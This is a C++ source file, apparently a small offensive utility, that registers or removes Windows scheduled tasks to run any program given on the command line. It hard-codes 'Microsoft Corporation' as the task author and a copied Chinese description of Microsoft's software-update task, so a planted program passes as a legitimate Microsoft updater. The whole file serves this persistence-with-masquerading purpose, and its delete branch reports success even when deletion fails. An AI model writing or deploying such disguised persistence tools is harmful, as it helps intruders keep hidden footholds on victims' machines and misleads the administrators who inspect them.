#include "ScheduleTask.h"

int main(int argc, char** argv)
{
	PigScheduleTask Task;
	BOOL bRet = FALSE;


	if (argc == 4)
	{
		char* ProgramPath = argv[1];

		// 更改xml中显示
		const char* wszDescription = "更新程序使你的 Microsoft 软件保持最新状态。如果此任务已禁用或停止，则 Microsoft 软件将无法保持最新状态，这意味着无法修复可能产生的安全漏洞，并且功能也可能无法使用。如果没有 Microsoft 软件使用此任务，则此任务将自行卸载。";
		const char* Author = "Microsoft Corporation";

		char* ProgramArgs = argv[2];

		

		//初始化
		bRet = Task.Initialization();
		if (bRet)
		{
			printf("\n Initialization Error: %x", bRet);
		}

		//删除计划任务
		if (!strcmp(ProgramPath, "rm"))
		{
			bRet = Task.DeleteTask((char*)ProgramArgs);
			if (bRet)
			{
				printf("\n DeleteTask Error: %x", bRet);
			}

			printf("\n DeleteTask %s Success!", ProgramArgs);
			return 0;
		}

		const char* TaskName = argv[3];

		//创建计划任务
		bRet = Task.CreateTask((char*)TaskName, ProgramPath, ProgramArgs,(char*)Author, (char*)wszDescription);

		if (bRet)
		{
			printf("\n CreateTask Error: %x", bRet);
		}
		else {
			printf("\n Successfully registered. ");
		}

	}
	else {
		//printf("\n ScheduleTask ");
		//printf("\n Usage: \n\tADD: .\\SchedukeTask.exe C:\\TEMP\\calc.exe args TaskName ");
		//printf("\n\tRM: .\\SchedukeTask.exe rm TaskName\n");

	}

	
	return 0;
}

